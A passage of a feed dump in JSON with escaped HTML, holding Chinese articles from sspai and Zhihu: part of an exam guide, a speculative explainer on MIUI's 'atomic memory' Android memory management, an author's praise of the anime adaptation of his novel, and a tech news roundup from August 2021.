题、每题 1 分，多项选择题和不定项选择题共 50 题、每题 2 分，两张试卷总分为 300 分。</p>\n<ul>\n<li>试卷一：习近平法治思想、法理学、宪法、中国法律史、国际法、司法制度和法律职业道德、刑法、刑事诉讼法、行政法与行政诉讼法</li>\n<li>试卷二：民法、知识产权法、商法、经济法、环境资源法、劳动与社会保障法、国际私法、国际经济法、民事诉讼法（含仲裁制度）</li>\n</ul>\n<p>客观题考试的合格分数线由司法部商最高人民法院、最高人民检察院等有关部门确定，在成绩公布时公布，考试合格的成绩在本年度和下一年度有效。也就是说，在今年客观题合格后，你可以选择明年再参加主观题的考试。</p>\n<h4>主观题</h4>\n<p>客观题通过之后，才可以报名参加主观题考试。主观题考试时间为 240 分钟，只有一套试卷，包括<strong>案例分析题、法律文书题、论述题</strong>等题型，分值为 180 分。具体考查科目为：习近平法治思想、法理学、宪法、刑法、刑事诉讼法、民法、商法、民事诉讼法（含仲裁制度）、行政法与行政诉讼法、司法制度和法律职业道德。</p>\n<p>与客观题考试类似，其合格分数线由司法部商最高人民法院、最高人民检察院等有关部门确定。如果两科考试都通过，经审核符合资格授予条件的，由司法部授予法律职业资格，颁发法律职业资格证书。</p>\n<h2>注册会计师全国统一考试</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c49uqmlb34tfgq1n87eg.png\"></figure><p>注：我没有参加过这个考试，也并非相关专业，以下所有表述均来自网络上的权威来源。所以，有关如何复习备考，我无法给出具体的建议。</p>\n<h3>报名条件与方式</h3>\n<p>CPA 考试分为专业阶段考试和综合阶段考试。其中，专业阶段考试需要具有<strong>高等专科以上学校的毕业学历</strong>，或者具有会计或者相关专业中级以上的技术职称才可以报考；综合阶段考试则须在专业阶段考试合格证已经取得后报考。由于学历限制，如果是在校大学生，需要大四才可以报考；考试通过后，仍需要验证学位证和毕业证才能够拿到合格证书。</p>\n<p>考试报名的网站是 <a href=\"http://cpaexam.cicpa.org.cn/\" target=\"_blank\">https://cpaexam.cicpa.org.cn</a>。报名后还需经过资格审核，资格审核通过并且缴费成功之后，报名才成功。</p>\n<h3>这个考试有什么用？</h3>\n<ul>\n<li>\n<strong>如果你是希望从事审计工作</strong>：进行公司或者项目审计工作，其报表最后需要<strong>注册会计师进行</strong>验证审核；也就是说，如果你没有获得 CPA 证，那么你的审计项目则无法依靠个人完成。</li>\n<li>\n<strong>如果你是希望从事会计工作</strong>：CPA 是会计行业资历证明的「天花板」，无论是找工作还是工作后升职加薪，CPA 证都是你会计能力的有力证明。</li>\n<li>\n<strong>如果你是希望从事证券、金融工作</strong>：此类工作不会强制要求 CPA 证，但是 CPA 的科目涉及公司运作与相关法律，对这方面的知识有所了解，将会促进这方面的具体工作。</li>\n</ul>\n<h3>考试流程</h3>\n<p>CPA 考试分为专业阶段考试和综合阶段考试，两个阶段的考试有分别的大纲。</p>\n<h4>专业阶段考试</h4>\n<p>专业阶段考试「测试考生是否具备注册会计师执业所需要的专业知识、是否掌握基本的职业技能和职业道德规范」。这个阶段一共有 6 门考试，分别是：会计、审计、财务成本管理、公司战略与风险管理、经济法和税法；其中，会计科目考试时间为 3 小时，审计、财务成本管理科目考试时间为 2.5 小时，公司战略与风险管理、经济法、税法科目考试时间为 2 小时。</p>\n<p>专业阶段考试，成绩 5 年内有效，5 年内考完 6 科并且通过，即可取得专业阶段考试的合格证。</p>\n<h4>综合阶段考试</h4>\n<p>综合阶段考试是在专业阶段考试通过后才可以报考。综合阶段考试分为试卷一和试卷二（试卷一和试卷二各50分），考试题型为综合案例分析。其中，试卷一以<strong>鉴证业务</strong>为重点，内容主要涉及会计、审计和税法等专业领域；试卷二以<strong>管理咨询和业务分析</strong>为重点，内容主要涉及财务成本管理、公司战略与风险管理和经济法等专业领域。试卷一、二的考试时间均为 3.5 小时。</p>\n<p>综合阶段的考试没有时间限制，只要取得专业阶段考试的合格证，即可参加。</p>\n<h2>写在最后</h2>\n<p>我的高考是 6 年前。6 年前的高考前夜，我写下：「高考只不过是开始，我们这一代人所追求的，正是<strong>多样性</strong>。」考试并非生活的全部，大学期间可以做的事情还有很多，大学校园还有更多精彩等着你们去发现探索。但无论如何，希望你能够做好自己的规划，走好人生的每一步。也希望在这个过程中，我的文章能起到微小的助力作用。</p>\n<p><strong>声明：</strong>本文图片中所有对考试的评价均为主观，如有不同意见，欢迎提出讨论。</p>\n<p><strong>致谢：</strong>在写作中，感谢我的几位好友提供的有关考试信息的说明与澄清！也感谢编辑给我提出这个选题，写作的过程很有意思。</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68224"},{"title":"找回被「杀后台」干掉的用户体验：聊聊我眼中的「原子内存」","date":"2021-08-17 03:24:59","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<h2>前言</h2>\n<p>比起最近雷布斯的个人演讲，其实我更好奇 MIUI 12.5 增强版（超级 Bug-list 修复版）推出的那四个性能优化项目：</p>\n<ul>\n<li>焦点计算 - 处理器智能调度机制</li>\n<li>原子内存 - 精细化内存管理机制</li>\n<li>液态存储 - 文件存储管理机制</li>\n<li>智能均衡 - 对旗舰硬件性能的智能调配</li>\n</ul>\n<p>作为技术爱好者，这个 「原子内存」 还真是提起了我的兴趣，因为其他三项还算比较好理解。毕竟内存管理这件事，是操作系统领域几乎永恒的课题。</p>\n<h2>官方解释</h2>\n<p>我们先来了解下 <a href=\"https://home.miui.com/\">MIUI 官方网站 </a>是如何介绍原子内存的。官网的海报动效还是阐释得比较清晰明了（辛苦设计师小姐姐，不知道又加了多少班）。</p>\n<p>最开始是几个独立的应用各自占有一定的内存，看看这绿，这不就是微信绿。看看这蓝，支付宝？看看这橙，这啥，淘宝吧估计是，肯定不是小米自己。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/15/9589aa58ccd69abe73eebd4d9803a07d.png\"></figure><p>然后，第二步是 <strong>拆分应用内存，结束不重要的任务 </strong>，刚才还是整块的内存占用现在在逻辑上被划分为了大小不等（即不同功能占用内存大小不同）的几块。这一步其实就是核心了，如何来划分呢？按什么维度划分呢？有没有可能划分失误反而影响用户体验呢？我们后面来聊。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/15/ae6c6945876364518dbc8eec036e2d2b.png\"></figure><p>第三步，<strong> 根据场景，进一步精细压缩 </strong>。这一步也很关键，不仅能结束优先级较低的任务，还能对剩余的任务进行内存占用的压缩。听起来有点玄乎，其实问题还是和第二步类似，如何对内存进行压缩？系统如何知道要压缩哪些内容呢？</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/15/b3de9b85cae94e7848d445c5fd23b69e.png\"></figure><p>带着上面这些问题，我们来简单聊一聊 MIUI 可能会如何实现这个原子内存，也即是说，以下内容均是基于个人经验提出的一些猜想，描述尽可能不那么硬核。</p>\n<h2>原理猜想</h2>\n<p>我们知道，现代操作系统基本都有进程（process）和线程（thread）的概念，用书本上的话说就是：</p>\n<blockquote><p>进程是资源分配的最小单位，线程是 CPU 调度的最小单位。</p></blockquote>\n<p>那么二者的关系，简单概括便是：一个运行中的应用程序就可以包含多个进程，一个进程又可以包含多个线程。</p>\n<p>拿微信举例来说，主功能聊天是一个进程，内置浏览器又是另一个进程，进程之间可以进行通信，但又可以互不影响，比如浏览器崩溃了，不影响你聊天，这也是多进程的好处之一。然后，在聊天进程内部，你下载表情包时会开启另一个线程来完成任务，而不会影响你的 UI 渲染线程，保证了交互的流畅性，这就是多线程的好处。</p>\n<p>大致了解这些基本概念后，我们就可以继续思考 MIUI 的原子内存了。</p>\n<p>Android 系统基于 Linux，当然也有进程的概念。我们平时俗称的 「杀进程」，一般就是指在最近任务中划掉相应的应用来终止其运行，在你划掉的那一瞬间，系统会杀掉此应用相关联的所有进程。而我们俗称的 「被杀后台」，就是应用在置于后台且不可见的时候，被系统为了节约内存等资源而杀掉，这对用户而言是一种被动的杀进程，某种程度上比较影响使用体验。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/15/a32183b73145700eb82299cfd47ef07a.png\"></figure><p>在 Android 的 <a href=\"https://developer.android.com/topic/performance/memory-management?hl=zh-cn\">官方文档 </a>中关于内存分配有这么一段话：</p>\n<blockquote><p>Android 平台在运行时不会浪费可用的内存。它会一直尝试利用所有可用内存。例如，系统会在应用关闭后将其保留在内存中，以便用户快速切回到这些应用。因此，通常情况下，Android 设备在运行时几乎没有可用的内存。要在重要系统进程和许多用户应用之间正确分配内存，内存管理至关重要。</p></blockquote>\n<p>其实这个解释和 Apple 官方之前建议用户不要频繁地手动杀进程是一个道理。因为应用启动，<strong> 进程重新创建的开销是很大的 </strong>。此外，接触过 Android 开发的同学都知道，系统在内存不足的时候也会尽可能地通知各应用，给了你 「体面」 处理自己的机会。</p>\n<p>然而，很多时候国产手机厂商也是不得已而为之，因 Android 应用可以在后台运行的特性，不管是各类巨无霸应用，还是小而美应用，都在努力让自己在后台保活而不遵守开发规范，生怕用户离它们而去。但这样争奇斗艳的后果就是用户设备续航能力急剧下降，挨骂的往往就是手机系统厂商了。</p>\n<p>「原子内存」 想解决的便是这个问题，既能让更多的应用不被系统<strong>完全</strong>杀掉，也能减少系统资源的占用，在功耗和功能之间取得一个相对平衡。</p>\n<h3>拆分内存</h3>\n<p>其实在 Android 应用层面的开发当中，中小型应用的开发者日常很少会接触到进程的概念，更多的是 Android 自己抽象的一套开发框架。在其设计架构中， Google 给开发者和用户提供了 「四大组件」：</p>\n<ul>\n<li>Activity - 可简单理解成我们打开的每一个活动页面，用于处理用户交互的逻辑</li>\n<li>Service - 服务，和 Activity 的逻辑结构类似，只不过没有界面，比如用于播放音乐、下载文件等</li>\n<li>BroadcastReceiver - 可理解为，Android 系统就是一个巨大的世界频道，每个应用都可以用小喇叭广播消息，当然也需要接收消息</li>\n<li>ContentProvider - 数据存储和提供的组件，内含标准接口，不同应用之间可通过此来共享内容</li>\n</ul>\n<p>感兴趣的同学可以去安装一个叫 <a href=\"https://github.com/zhaobozhen/LibChecker\" target=\"_blank\">LibChecker</a> 的应用，可以查看已安装应用都有哪些以上组件，往往一个应用会包含很多个各种各样的组件，并常以功能的维度来划分。</p>\n<p>这些组件是 Android 开发的基础，对于任意一个组件，它都可以独占一个进程（比如我们上面提到的内置浏览器 WebView），也可以和其他组件共享同一个进程，大多数情况都是后者。组件的本质也就是系统创建的一个内存对象，同时，每个组件都有自己的生命周期，在应用进程不被杀掉之前，可以提前结束（比如你打开登录页面完成登录，这个 Activity 的使命就完成了，可以被系统回收资源）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/15/35dab82b6279a0d7c3175e2c2b77aaa1.png\"></figure><p>所以在我第一时间看到 MIUI 原子内存的宣传时，就想到了对四大组件的精细化查杀。拆分内存这一行为可能实质上就是<strong>把应用内的各个组件进行分类并按优先级排序</strong>，销毁低优先级的组件，保证用户可见和正在使用的组件活着就行了，如此就能节省很多内存。当用户需要再次使用某组件时，重新创建启动便是。</p>\n<p>又拿微信来举例，当你扫码支付后，又回到聊天界面，聊了几句再把微信置于后台，这时候你去干别的事情了，<strong>系统是不是可以把刚才支付相关的资源都回收掉呢</strong>？</p>\n<p>当然，如果销毁和创建的行为过于频繁，也会消耗不少的系统资源，所以我猜测除了设计组件优先级等基本策略，还会有一些机器学习的玩法在里面，<strong> </strong>更精准地识别哪些可以被销毁<strong> </strong>。在用户使用过程中体验会越来越好，这是一个双向正反馈的过程。</p>\n<p>最近在 MIUI 的官方论坛也看到一些解释提到「进程级」查杀，其实这个就更好理解了，因为本身很多业务相关性强的组件就在同一个进程内，一个大型应用往往有很多进程在同时运行，那么系统也可以杀掉某些暂时用不到的进程（相当于还能一次性销毁多个组件），而非粗暴地杀掉整个应用导致用户回来时一切都要重来。</p>\n<h3>精细压缩</h3>\n<p>说到压缩，我们可以从最基本的一些解释中了解原理：</p>\n<blockquote><p>它就是移除多余的空白字符，插入单个的重复字符指出一个字符串中重复的字符，以及将小型的位串用频繁使用的字符替代。</p></blockquote>\n<p>压缩其实是一个很朴素的概念，当你知道下一秒的画面跟这一秒一致时，是不是可以少存储几帧数据。在内存上，也是类似的方法，它是真正能够节约物理空间的。</p>\n<p>在 MIUI 的海报中，有个非常关键的前提就是：<strong>根据场景</strong>。也就是说，并不是无脑地对所有内存占用进行压缩，而是根据用户使用的场景，<strong>来判断哪些进程或者组件所占用的内存可以压缩，哪些最好不要压缩</strong>，一切以用户体验为前提。这个压缩的策略，和上述的拆分内存类似，可能也会有机器学习的施展空间，当然，用黑白名单来进行简单粗暴的实现也不是不可以。</p>\n<p>精细压缩这一步，从 Android 系统的体系结构来讲，总体可以分为两方面，一是<strong>交换压缩 </strong>，二是<strong>垃圾回收 </strong>。</p>\n<h4>交换压缩</h4>\n<p>先看看官方介绍：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/15/7e080624c9036d6ece5b4c439ee02809.png\"></figure><blockquote>\n<p>Android 设备包含三种不同类型的内存：RAM、zRAM 和存储器。</p>\n<ul>\n<li>RAM 是最快的内存类型，但其大小通常有限。高端设备通常具有最大的 RAM 容量。</li>\n<li>zRAM 是用于交换空间的 RAM 分区。所有数据在放入 zRAM 时都会进行压缩，然后在从 zRAM 向外复制时进行解压缩。这部分 RAM 会随着页面进出 zRAM 而增大或缩小。设备制造商可以设置 zRAM 大小上限。</li>\n<li>存储器中包含所有持久性数据（例如文件系统等），以及为所有应用、库和平台添加的对象代码。存储器比另外两种内存的容量大得多。<strong>在 Android 上，存储器不像在其他 Linux 实现上那样用于交换空间（swap），因为频繁写入会导致这种内存出现损坏，并缩短存储媒介的使用寿命 </strong>。</li>\n</ul>\n</blockquote>\n<p>我们可以看出，zRAM 是内存压缩的关键所在，相当于在内存上划分出一小块区域用于非活跃内存占用的压缩存储。这个 「z」，大概就是 zip 的意思吧。所以，在内存压缩的底层实现上，原生 Android 已经搞定了，MIUI 不需要自行实现这些内存管理机制，最多是<strong>在此基础上根据用户使用场景进行算法优化或者动态调整配置 </strong>。</p>\n<p>这里特别要注意的是，官方文档提到：<strong>在 Android 上，存储器不像在其他 Linux 实现上那样用于交换空间 </strong>。这一点也否认了最近网上关于 MIUI 原子内存的讨论中 「就是 Linux 的 swap 机制而已」 之类的看法。</p>\n<p>我个人认为，Linux 的 swap 机制不会特别适用于移动设备，因为移动设备的存储器基本上都是类似 SSD 的闪存，用作交换空间来存取内存数据是非常减寿的，对手机来说，闪存寿命下降就意味着卡顿。即便是现在的电脑，也不会设置那么大的 swap 空间了，因为很多电脑内存本身就很大。</p>\n<h4>垃圾回收</h4>\n<p>我们每一个应用都运行在一个独立的 Android 虚拟机之上，所以应用的每一个进程也可叫做虚拟机进程。Android 虚拟机可以粗浅地看作 Java 虚拟机（JVM）的魔改版本，<strong>它不能运行原生 Java 程序</strong>。<strong>垃圾回收（GC）是 JVM 内存管理的核心机制之一</strong>。这里就不赘述了，简单来说就是系统对内存单元的整理和清除。</p>\n<p>垃圾回收和刚才的交换压缩一样，它们管理内存的粒度都是 「内存页（page）」，而不是进程和 Android 组件了，对于上层的应用来说，是没有什么感知的，系统底层在默默地自我调节。</p>\n<p>MIUI 原子内存在垃圾回收层面应该不会去做什么改动，因为 GC 机制比较底层，而且也相对成熟稳定，MIUI 做的事情更多是用户层面的，业务层面的，属于 GC 的上层调用者。</p>\n<p><strong>精细压缩可能会在何时触发、如何更有效地触发垃圾回收上面下功夫</strong>。</p>\n<h2>后话</h2>\n<p>做了这么多猜测，其实也没有特别深入的技术细节讨论，但我在查阅研究过程中，还是能感受到 MIUI 在系统层面的努力，而不仅仅限于做 「UI」。毕竟这么花里胡哨的功能命名都唱出来了，怎么也得有点干货才行吧。</p>\n<p>此外，写完了我才想到忘了提及以前的 Android 玩机工具写轮眼，它的主要功能就是由用户自行决定销毁哪些组件，MIUI 原子内存或许也从中借鉴了一些思路。</p>\n<p>还有一点收获就是，现在我们可以在很多移动设备用户场景遇到 AI 技术的落地或者是落地的可能性，借此机会，有空的话可以再跟大家聊聊<strong>端侧 AI</strong>。</p>\n<p>13 号当晚我也顺利升级到了这个 MIUI 12.5 增强版，感受了一下，同时开 10 个常用 App，后台被杀的情况确实有所改善，而且剩余内存也比以前多了。对普通用户来说这就是简单真实的感受，有效果，说明有点东西。</p>\n<h2>参考</h2>\n<ul>\n<li><a href=\"https://developer.android.com/guide/components/activities/process-lifecycle?hl=zh-cn\">进程和应用生命周期 | Android Developers</a></li>\n<li><a href=\"https://developer.android.com/topic/performance/memory-management?hl=zh-cn#low-memory_killer\">进程间的内存分配 | Android Developers</a></li>\n<li><a href=\"https://www.zhihu.com/question/478811156\">如何评价 8 月 10 日小米正式推出的 MIUI 12.5 增强版？</a></li>\n<li><a href=\"https://v2ex.com/t/795335\">MIUI 最近那个原子内存是什么原理？ - V2EX</a></li>\n</ul>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68300"},{"title":"如何评价国产动画《游侠战纪》？","date":"2021-08-17 03:00:10","description":"\n<p>谢邀，原著作者来答一波。</p>\n<p>首先，《游侠战纪》呢，是小佛在网易云阅读发表的悬疑探险小说《夜行者：平妖二十年》改编而成的。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-c94ba6d75b3e7cf86f56e85b60830c4f_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1039\" data-rawheight=\"532\" data-watermark=\"watermark\" data-original-src=\"v2-c94ba6d75b3e7cf86f56e85b60830c4f\" data-watermark-src=\"v2-d00fea08c919a2f1335cb5c932e1fcaa\" data-private-watermark-src=\"v2-909c386c6dee02e44aca7e4d162864a1\"></p>\n<p>“人之假造为妖，物之性灵为精，人魂不散为鬼。天地乖气，忽有非常为怪，神灵不正为邪，人心癫迷为魔，偏向异端为外道。”</p>\n<p>全书一共分为十一卷加几个番外篇。</p>\n<p>分别是：</p>\n<p><img src=\"https://pic1.zhimg.com/v2-e971d6171b046fc90a39a90d745558f7_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"384\" data-rawheight=\"620\" data-watermark=\"watermark\" data-original-src=\"v2-e971d6171b046fc90a39a90d745558f7\" data-watermark-src=\"v2-459f42b622f73d2480012e36628711be\" data-private-watermark-src=\"v2-123d096d9baaa258bdcd52567fe0f747\"></p>\n<p>整体的规模呢，还是很宏大的，世界观也比较齐全，所以一开始的时候，其实还挺担心改编的难度的。</p>\n<p>不过当整体的动漫剧集出来之后，我发现动漫制作，其实真的还是挺用心的。</p>\n<p>首先讲剧情节奏。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-ceac8737b54a0a9fac62f434038575dc_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"319\" data-rawheight=\"734\" data-watermark=\"watermark\" data-original-src=\"v2-ceac8737b54a0a9fac62f434038575dc\" data-watermark-src=\"v2-ce14bda3eef96352cbaf9855cd70b1b0\" data-private-watermark-src=\"v2-fb8946eb3063c64e7ec3c2833f7f270f\"></p>\n<p>众所周知，动漫以及影视改编，最困难的就是去芜存菁，将小说原本平缓的节奏加快，一下子就调动观众的情绪点和代入感，把小说最精华的部分给表现出来。这一点《游侠战纪》就做得非常不错，前情交代、变化和转折，以及仇恨点的累加，还有小说要点的节奏感，几乎都表现得十分优秀，并且在人物方面，正反两派的选择与塑造，我是觉得都表现出了很高的职业水准……</p>\n<p>总之我是一口气看到最新番集，感觉十分流畅，没有阻碍。</p>\n<p>********</p>\n<p>其次是动漫画风。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-ad7c6fcee8fd8ed103993c45416dc3a7_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1302\" data-rawheight=\"720\" data-watermark=\"watermark\" data-original-src=\"v2-ad7c6fcee8fd8ed103993c45416dc3a7\" data-watermark-src=\"v2-08d9d0948abe88bf69d67b41c8a4de3b\" data-private-watermark-src=\"v2-644f61c6acfd231945160003957a4830\"></p>\n<p>说实话，我是比较少看动漫的一类观众，但《游侠战纪》出来之后，我特意将国内现在播放的一些动漫番剧找出来看了一下，感觉画风和制作水平，都十分良心，无论是服饰、建筑和人物建模的质感，还是细节方面，甚至毛发之类的渲染……都属于非常用心、并且不惜经费的那种，特别是这种3D的动漫，更是如此。</p>\n<p>总之从观众角度来讲，就是诚意满满，十分用心。</p>\n<p>*********</p>\n<p>因为小佛不是专业动漫领域的人员，所以没办法讲太多的专业内容。</p>\n<p>但我觉得，有一个好的故事，好的世界观，以及鲜活的人物，然后制作方认真地吃透原作，并且在节奏与剧情上进行影视化角度的改进，无论是画面，还是人物，还是制作水平，都是优中选优，上上之选，我觉得《游侠战纪》，就已经具备了十分优秀的品质。</p>\n<p>同时我觉得如果国漫都有这样的用心和努力，大家总是聊到的“国漫崛起”，也真的不再是说说而已，而是脚踏实地，努力达成了！</p>\n<p>当然，看完之后，其实想讲的很多很多，特别是许多的细节，当真是让人感动，还是希望大家能够去咱们腾讯视频，去观看动漫一下，一定能过发现更多的精彩细节，以及惊喜的。</p>\n<p>*********</p>\n<p>另外，作为原著作者，小佛倒是可以唠两句。</p>\n<p>《游侠战纪》的原著《夜行者：平妖二十年》绝对精彩，动漫现在只是拍到了一二卷，更多的精彩内容，还未呈现，请大家给予更多的支持，让全篇十一卷，能过展现在大家的面前，我可以给你们保证，这绝对是一个足够精彩、并且让人感动的故事，不用担心后续故事的不足……</p>\n<p>大家还可以关注一下小佛的微信公众号：“南无袈裟理科佛”，里面也有相当多关于小说的内容哦……</p>\n<p><img src=\"https://pic1.zhimg.com/v2-3b45636b4573a98ca2e7fc5e7453195e_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1160\" data-rawheight=\"2700\" data-watermark=\"watermark\" data-original-src=\"v2-3b45636b4573a98ca2e7fc5e7453195e\" data-watermark-src=\"v2-a93499e4abda3decbc7278a20f1f6808\" data-private-watermark-src=\"v2-3bbc0be90e6dd4f208c9928327514082\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/nan-wu-jia-sha-li-ke-fo?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">南无袈裟理科佛</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/480075437/answer/2064570230?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">1 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/453456934?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何看刺客伍六七第三季第六集?</a><br><a href=\"http://www.zhihu.com/question/362874872?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价刺客伍六七第二季第九集？</a><br>\n","link":"http://www.zhihu.com/question/480075437/answer/2064570230?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"派早报：Intel 公布显卡品牌 Intel Arc、三星发布新一代 Eco OLED 屏幕等","date":"2021-08-17 00:57:36","description":"\n<h2>你可能错过的新鲜事</h2>\n<h3>Intel 公布显卡品牌 Intel Arc</h3>\n<p>8 月 16 日，Intel 公布了旗下全新消费者领域 GPU 品牌 Intel Arc，中文品牌名「锐炫」。该品牌下包括未来若干代 Intel 高端独立显卡的硬件及相关软件。Intel Arc 首代产品将于 2022 年第一季度亮相，代号「Alchemist」，该显卡即为此前曾被曝光的 Intel DG2。该产品基于 Xe-HPG 架构，将包括台式机与笔记本显卡，且搭载基于 AI 的超级采样技术。<a href=\"https://www.theverge.com/2021/8/16/22626912/intel-arc-gpu-brand-alchemist-codename-release-date\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4dgf6db34tb094k52dg.png\"></figure><h3>三星发布新一代 Eco OLED 屏幕</h3>\n<p>三星于 8 月 16 日正式宣布，已经成功开发出低功耗智能手机 OLED 面板 Eco² OLED，该面板具有阻挡外部光线反射的屏幕叠层结构，可以替代显示屏的核心材料偏光片，使得透光率提升 33% ，功耗降低 25%，该面板首次运用在三星近期发布的 Galaxy Z Fold3 可折叠显示屏，三星表示该面板还可以为面板内的摄像头模块提供更多的光线，从而确保了屏下摄像头技术的应用。<a href=\"https://www.cnbeta.com/articles/tech/1166665.htm\" target=\"_blank\">来源</a></p>\n<h3>华硕发布 ROG 游戏手机 5s 系列</h3>\n<p>8 月 16 日，华硕正式在海外市场发布其 ROG 游戏手机 5s 以及 5s Pro。该系列搭载高通骁龙 888 Plus 处理器，配备 6.78 英寸 144Hz AMOLED 主屏以及彩色 AMOLED 背屏，采用了 6000mAh 的电池，并支持 65W 快充。官方确认将在 5 系列销售完毕后正式上架，但目前暂未透露相关价格信息。<a href=\"https://www.ithome.com/0/569/658.htm\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4dgf6tb34tb094k52e0.png\"></figure><h3><strong>Apple 因专利侵权被开 3 亿罚单</strong></h3>\n<p>近日，美国得州法院陪审团针对此前 Optis 无线技术公司去年对 Apple 提起专利诉讼案件进行裁定，明确苹果存在侵犯 Optis 无线技术专利的行为，要求其向 Optis 和相关公司赔付 3 亿美元。<a href=\"https://www.pingwest.com/w/247898\" target=\"_blank\">来源</a></p>\n<h3>ITC 初步裁定 Google 侵犯五项 Sonos 专利</h3>\n<p>8 月 13 日 ITC 初步裁定，Google 侵犯了五项 Sonos 专利并已经下发禁令要求 Google 不得再引进侵犯专利的相关设备，由于目前只是给出初步的裁决，最终的决定将会在 12 月 13 日正式公布。Google 表示他们并未使用 Sonos 的相关技术，因此不会认可相关的裁定，将会在接下来的审核过程中提出自己的看法。<a href=\"https://cn.engadget.com/sonos-google-itc-compliant-initial-ruling-110037467.html\" target=\"_blank\">来源</a></p>\n<h2>看看就行的小道消息</h2>\n<ul>\n<li>Google Pixel 5a 真机图在一维修公司上传的照片中曝光，该机型或将于 8 月 17 日正式公布。Android Authority 整理了截止目前该机型的传言，你可以点击 <a href=\"https://www.androidauthority.com/google-pixel-5a-1196405/\" target=\"_blank\">此处</a> 查看。</li>\n<li>彭博社记者 Mark Gurman 称，Apple 将在 Apple Watch Series 7 发布的同时，向 Apple Fitness+ 订阅者推送「Time to Run」与「Audio Meditations」两项新功能。<a href=\"https://www.macrumors.com/2021/08/16/apple-to-launch-variations-time-to-walk-feature/\" target=\"_blank\">来源</a>\n</li>\n</ul>\n<h2>少数派的近期动态</h2>\n<ul>\n<li>📈 特惠订阅 + 深度教程，<a href=\"https://sspai.com/item/25\" target=\"_blank\">Microsoft 365 工具升值包</a> 带你进阶学习 Office 使用技巧。</li>\n<li>🌟 少数派会员通讯《<a href=\"https://sspai.com/prime/precog/vol06-pre-toys-for-adults\" target=\"_blank\">大人的玩具</a>》已经上线，来看看乐高与模型的故事，祝你玩得开心。</li>\n<li>📕 由少数派编辑部联合优秀作者出版的实体书《数字时代的效率手册》上线电商平台，<strong>少数派预购会员将获赠该书</strong>。<a href=\"https://item.jd.com/12914331.html\" target=\"_blank\">5 折下单 &gt;</a>\n</li>\n<li>⭐ 又到开学季，面对学生朋友送点什么好？去 <a href=\"https://sspai.com/bullet/1628500218\" target=\"_blank\">一派</a> 聊聊。</li>\n</ul>\n<h2>你可能错过的文章</h2>\n<ul>\n<li>🪄 <a href=\"https://sspai.com/post/68250\" target=\"_blank\">比生产力更实在的，是找到属于你的 iPad Pro 使用方式</a>\n</li>\n<li>📻️ <a href=\"https://sspai.com/post/68298\" target=\"_blank\">一日一技 | 使用 NAS 多端同步 MoonFM 播客订阅数据</a>\n</li>\n<li>🎭 <a href=\"https://sspai.com/post/68218\" target=\"_blank\">多少一样，高下不同 —— 差分隐私是如何保护个人隐私的？</a>\n</li>\n<li>⭐️️ <a href=\"https://sspai.com/post/68330\" target=\"_blank\">派评 | 近期值得关注的 App</a>\n</li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a 